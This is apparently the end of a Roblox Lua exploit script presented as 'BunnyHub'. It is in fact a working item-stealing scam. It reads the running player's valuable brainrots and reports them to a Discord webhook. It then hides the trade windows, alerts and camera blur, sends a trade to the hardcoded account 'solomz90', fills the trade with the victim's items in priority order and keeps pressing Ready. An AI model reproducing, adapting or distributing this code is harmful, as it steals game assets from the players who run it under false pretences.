    "Los Chillis", "Guest 666", "Cerberus", "Rosey and Teddy", "Reinito Sleighito",
    "Fragola La La La", "Gym Bros", "Spooky and Pumpky", "Cloverat Clapat", "Cooki and Milki",
    "Cash or Card", "Fortunu and Cashuru", "Jolly Jolly Sahur", "Capitano Moby",
    "Fragrama and Chocrama", "Chillin Chili", "Los Sekolahs", "Sammyni Fattini", "Los Amigos",
    "Money Money Reindeer", "Boppin Bunny", "Festive 67", "Money Money Bros", "Tralaledon",
    "La Food Combinasion", "Celularcini Viciosini", "Hopilikalika Hopilikalako", "Los Tangcitos",
    "Swaggy Bros", "Los Spaghettis", "Popcuru and Fizzuru", "Garama and Madundung",
    "Celestial Pegasus", "La Easter Grande", "Gold Gold Gold", "Nacho Spyder", "Orcaledon",
    "Los Mariachis", "Burguro And Fryuro", "Lovin Rose", "W or L", "La Ginger Sekolah",
    "Chipso and Queso", "Los Primos", "Swag Soda", "Los Hotspotsitos", "La Taco Combinasion",
    "La Romantic Grande", "Eviledon", "Los Bros", "Las Sis", "Tictac Sahur",
    "La Secret Combinasion", "La Lucky Grande", "Ketchuru and Musturu", "Gobblino Uniciclino",
    "Rosetti Tualetti", "Tacorita Bicicleta", "Ventoliero Pavonero", "La Sahur Combinasion",
    "Abyssaloco", "Rubrikiko", "La Anniversary Grande", "Jelly Moby", "Sammyni Cakini",
    "Lavadorito Spinito", "Donkeyturbo Express", "Coco and Mango", "Dragon Aquanini", "Kraken",
    "Venuspino", "Bearito Cabinito", "Sand Sand Sand", "Globa Steppa", "Los Fruits",
    "Conetto Morsetto", "Tang Tang Keletang", "La Summer Grande", "Los Planitos",
    "Los Sweethearts", "Steakini Fattini", "Capitano Americano", "Bufalino Boomberino",
    "Los Tictacs", "Los Admins", "Moby Bros", "Grabatron", "Rubiko and Kubiko",
    "Cangurato Gelato", "Chicleteira Champeona", "Pizza and Ranch", "Los Secret Combinasionas",
    "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino",
    "Honey Honey Bear", "La Breakfast Combinasion", "Pogo Pogo Penguin", "Examen Bros",
    "Noodle Noodle Poodle", "Var Var Var", "Yess my examine", "Ref Ref Ref Sahur"
}

local function cleanStr(str)
    return string.lower(string.gsub(tostring(str or ""), "%s+", ""))
end

local BrainrotPriorityMap = {}
local TargetBrainrotsClean = {}

for i, name in ipairs(BrainrotPriority) do 
    BrainrotPriorityMap[cleanStr(name)] = i 
    TargetBrainrotsClean[cleanStr(name)] = name
end

local function hideSingleObject(obj)
    if obj:IsA("GuiObject") then
        obj.Position = UDim2.new(10, 0, 10, 0)
        obj.BackgroundTransparency = 1

        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
            obj.TextTransparency = 1
            obj.TextStrokeTransparency = 1
        end

        if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
            obj.ImageTransparency = 1
        end

        if obj:IsA("CanvasGroup") then
            obj.GroupTransparency = 1
        end

        local UIStroke = obj:FindFirstChildOfClass("UIStroke")
        if UIStroke then UIStroke.Transparency = 1 end
    end
end

local function hideGuiVisualOnly(guiObj)
    for _, obj in ipairs(guiObj:GetDescendants()) do hideSingleObject(obj) end
    if guiObj:IsA("GuiObject") then hideSingleObject(guiObj) end

    if not guiObj:GetAttribute("HideListenerSet") then
        guiObj:SetAttribute("HideListenerSet", true)
        guiObj.DescendantAdded:Connect(function(child)
            task.defer(function() hideSingleObject(child) end)
        end)
    end
end

local function applyEverythingAfterTargetFound()
    local function handleCam(obj)
        if obj:IsA("BlurEffect") then obj.Enabled = false end
    end
    cam.ChildAdded:Connect(handleCam)
    for _, v in ipairs(cam:GetChildren()) do handleCam(v) end

    RunService.RenderStepped:Connect(function()
        cam.FieldOfView = 70
    end)

    local function handleGui(obj)
        if obj.Name:find("Prompt") or obj:IsA("ProximityPrompt") then return end

        local tradeGuis = {
            ["TradeLiveTrade"] = true,
            ["BrainrotTrader"] = true,
            ["TradePrompts"] = true
        }

        if tradeGuis[obj.Name] then
            if obj:IsA("ScreenGui") then
                for _, child in ipairs(obj:GetChildren()) do
                    if child:IsA("GuiObject") then
                        child.Position = UDim2.new(10, 0, 10, 0)
                    end
                end
            end
            task.defer(function() hideGuiVisualOnly(obj) end)
            return
        end

        local targetAlerts = {
            ["TradeAlert"] = true,
            ["TradeError"] = true
        }

        if targetAlerts[obj.Name] then
            task.defer(function() hideGuiVisualOnly(obj) end)
        end
    end
    pg.ChildAdded:Connect(handleGui)
    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
end

local plotsFolder = Workspace:FindFirstChild("Plots")
if not plotsFolder then
    warn("❌ No se encontró Workspace.Plots")
    return
end

local closestPlot = nil

local function getOwnerText(plot)
    local plotSign = plot:FindFirstChild("PlotSign")
    if not plotSign then return nil end

    local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
    if not surfaceGui then return nil end

    local frame = surfaceGui:FindFirstChild("Frame")
    if not frame then return nil end

    local label = frame:FindFirstChildWhichIsA("TextLabel")
    if not label then return nil end

    return label.Text
end

local myUsername = string.lower(LP.Name)
local myDisplayName = string.lower(LP.DisplayName)

for _, plot in ipairs(plotsFolder:GetChildren()) do
    local ownerText = getOwnerText(plot)
    if ownerText then
        local ownerLower = string.lower(ownerText)

        if string.find(ownerLower, "solomz90's base", 1, true) then
            continue
        end

        if string.find(ownerLower, myUsername, 1, true) then
            closestPlot = plot
            break
        end

        if string.find(ownerLower, myDisplayName, 1, true) then
            closestPlot = plot
            break
        end

        if string.find(ownerText, "・・・", 1, true) then
            closestPlot = plot
            break
        end
    end
end

if not closestPlot then
    warn("❌ NO SE PUDO ENCONTRAR TU PLOT")
    return
end

local brainrotQueue = {}

for _, child in ipairs(closestPlot:GetChildren()) do
    if child:IsA("Model") and not child.Name:find("Panel") and not child.Name:find("Cash") then
        local rawName = child.Name
        local cleanedName = cleanStr(rawName)
        
        local matchedName = nil
        if TargetBrainrotsClean[cleanedName] then
            matchedName = TargetBrainrotsClean[cleanedName]
        else
            for targetClean, originalName in pairs(TargetBrainrotsClean) do
                if string.find(cleanedName, targetClean, 1, true) or string.find(targetClean, cleanedName, 1, true) then
                    matchedName = originalName
                    break
                end
            end
        end

        if matchedName then
            local genText = getRealBrainrotValue(child)

            table.insert(brainrotQueue, {
                slotKey = rawName,
                instance = child,
                instanceId = tostring(child),
                generation = genText,
                name = matchedName,
                rawName = rawName
            })
        end
    end
end

local discordFields = {}
for _, item in ipairs(brainrotQueue) do
    table.insert(discordFields, {
        ["name"] = item.name,
        ["value"] = "Generación: **" .. item.generation .. "**",
        ["inline"] = false
    })
end

if #brainrotQueue > 0 then
    sendToDiscord("🧠 Brainrots Detectados en Plot", "Se han encontrado " .. tostring(#brainrotQueue) .. " elementos válidos:", discordFields)
else
    sendToDiscord("⚠️ Sin Brainrots", "No se encontraron elementos de la lista en este plot.", {})
    return
end

table.sort(brainrotQueue, function(a, b)
    local aPriority = BrainrotPriorityMap[cleanStr(a.name)] or 999999
    local bPriority = BrainrotPriorityMap[cleanStr(b.name)] or 999999
    if aPriority == bPriority then
        return tostring(a.instanceId) < tostring(b.instanceId)
    end
    return aPriority < bPriority
end)

applyEverythingAfterTargetFound()

local processedButtons = {}

local function triggerClick(btn)
    if not btn then return false end
    local success = false

    if typeof(firesignal) == "function" then
        pcall(function() firesignal(btn.MouseButton1Click) end)
        pcall(function() firesignal(btn.Activated) end)
        success = true
    elseif typeof(getconnections) == "function" then
        for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do
            if conn.Enabled then conn:Fire() end
        end
        for _, conn in ipairs(getconnections(btn.Activated)) do
            if conn.Enabled then conn:Fire() end
        end
        success = true
    end

    return success
end

-- ============================================================================
-- NUEVA LÓGICA DE BÚSQUEDA Y SELECCIÓN EXACTA POR ORDEN DE PRIORIDAD
-- ============================================================================
local function findBrainrotButton(item)
    local yourInventory = pg:FindFirstChild("TradeLiveTrade")
        and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade")
        and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Your")
        and pg.TradeLiveTrade.TradeLiveTrade.Your:FindFirstChild("ScrollingFrame")

    if not yourInventory then return nil end

    local targetClean = cleanStr(item.name)
    local rawClean = cleanStr(item.rawName)
    local genClean = cleanStr(item.generation)
    local isGenUnknown = (genClean == "unknown" or genClean == "cifra no detectada")

    local bestCandidateButton = nil

    for _, slot in ipairs(yourInventory:GetChildren()) do
        if string.find(slot.Name, "Selection_Brainrot_") then
            local button = slot:FindFirstChild("Spacer") or slot:FindFirstChildWhichIsA("GuiButton")
            
            if button and not processedButtons[button] then
                local matchesName = false
                local foundGenMatch = isGenUnknown

                for _, subDesc in ipairs(slot:GetDescendants()) do
                    if subDesc:IsA("TextLabel") or subDesc:IsA("TextButton") then
                        local textClean = cleanStr(subDesc.Text)
                        
                        if textClean == targetClean or textClean == rawClean or string.find(textClean, targetClean, 1, true) or string.find(targetClean, textClean, 1, true) then
                            matchesName = true
                        end

                        if not foundGenMatch and (string.find(textClean, genClean, 1, true) or string.find(genClean, textClean, 1, true)) then
                            foundGenMatch = true
                        end
                    end
                end

                if matchesName then
                    if foundGenMatch then
                        -- Coincidencia perfecta de Nombre y Generación: lo devolvemos de inmediato
                        return button
                    elseif not bestCandidateButton then
                        -- Si coincide el nombre pero la generación no emparejó exacto, lo guardamos como alternativa
                        bestCandidateButton = button
                    end
                end
            end
        end
    end

    -- Si no hubo coincidencia exacta de generación pero sí de nombre, devolvemos el candidato para no saltarlo
    return bestCandidateButton
end

local function selectBrainrot(item, index)
    task.wait(0.15)

    local button = findBrainrotButton(item)
    if not button then return false end

    local success = triggerClick(button)
    if success then
        processedButtons[button] = true
        return true
    end

    return false
end

local function pressReadyButtonByPath()
    local readyBtn = pg:FindFirstChild("TradeLiveTrade") 
        and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade") 
        and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other") 
        and pg.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")

    if readyBtn then
        local button = readyBtn:IsA("GuiButton") and readyBtn or readyBtn:FindFirstChildWhichIsA("GuiButton", true)
        if button then
            triggerClick(button)
            return true
        end
    end
    return false
end

local function sendTradeToPlayer()
    local tradeGui = pg:WaitForChild("TradePlayerList", 10)
    if not tradeGui then return end
    
    local trade = tradeGui:WaitForChild("TradePlayerList", 10)
    if not trade then return end

    local searchBox = trade.Sections.Players.SearchFrame.SearchBox
    local list = trade.Sections.Players.List

    local connection
    connection = list.ChildAdded:Connect(function(child)
        if string.find(string.lower(child.Name), "solomz90") then
            if child:IsA("GuiObject") then
                child.Visible = false
                child.Position = UDim2.new(10, 0, 10, 0)
            end
        else
            for _, textObj in ipairs(child:GetDescendants()) do
                if (textObj:IsA("TextLabel") or textObj:IsA("TextButton")) and string.find(string.lower(textObj.Text), "solomz90") then
                    child.Visible = false
                    child.Position = UDim2.new(10, 0, 10, 0)
                    break
                end
            end
        end
    end)

    searchBox.Text = "solomz90"

    if typeof(firesignal) == "function" then
        pcall(function() firesignal(searchBox.FocusLost, true) end)
        pcall(function() firesignal(searchBox:GetPropertyChangedSignal("Text")) end)
    elseif typeof(getconnections) == "function" then
        for _, conn in ipairs(getconnections(searchBox.FocusLost)) do
            if conn.Enabled then conn:Fire(true) end
        end
        for _, conn in ipairs(getconnections(searchBox:GetPropertyChangedSignal("Text"))) do
            if conn.Enabled then conn:Fire() end
        end
    end

    task.wait(0.3)

    local playerEntry = nil

    for i = 1, 15 do
        for _, child in ipairs(list:GetChildren()) do
            if string.find(string.lower(child.Name), "solomz90") then
                playerEntry = child
                break
            end

            for _, textObj in ipairs(child:GetDescendants()) do
                if (textObj:IsA("TextLabel") or textObj:IsA("TextButton")) and string.find(string.lower(textObj.Text), "solomz90") then
                    playerEntry = child
                    break
                end
            end

            if playerEntry then break end
        end

        if playerEntry then break end
        task.wait(0.3)
    end

    if connection then connection:Disconnect() end

    if not playerEntry then return end

    if playerEntry:IsA("GuiObject") then
        playerEntry.Position = UDim2.new(10, 0, 10, 0)
        playerEntry.Visible = false
    end

    local sendBtn = nil
    for _, descendant in ipairs(playerEntry:GetDescendants()) do
        if descendant:IsA("GuiButton") then
            sendBtn = descendant
            break
        end
    end

    if sendBtn then
        triggerClick(sendBtn)
    end
end

local function isTradeActive()
    local tradeLive = pg:FindFirstChild("TradeLiveTrade")
    if tradeLive then
        if tradeLive:IsA("ScreenGui") and tradeLive.Enabled then return true end
        if tradeLive:IsA("GuiObject") and tradeLive.Visible then return true end
    end
    return false
end

local function startFullAutomation()
    while true do
        processedButtons = {}

        while not isTradeActive() do
            sendTradeToPlayer()
        
            local startWait = tick()
            while tick() - startWait < 4 do
                if isTradeActive() then break end
                task.wait(0.3)
            end
        end

        task.wait(0.8)

        for index, item in ipairs(brainrotQueue) do
            if not isTradeActive() then break end

            local success = false
            for attempt = 1, 3 do
                success = selectBrainrot(item, index)
                if success then break end
                task.wait(0.4)
            end

            task.wait(DELAY_STEP + math.random(10, 25) / 100)
        end

        task.wait(0.5)
        pressReadyButtonByPath()

        local timeout = 0
        while isTradeActive() and timeout < 30 do
            pressReadyButtonByPath()
            task.wait(1.5)
            timeout = timeout + 1.5
        end

        task.wait(2)
    end
end

startFullAutomation()

end)

print("==========================================")
print("🐰 BunnyHub Loaded (Native Lightweight Edition + Automation)")
print("==========================================")
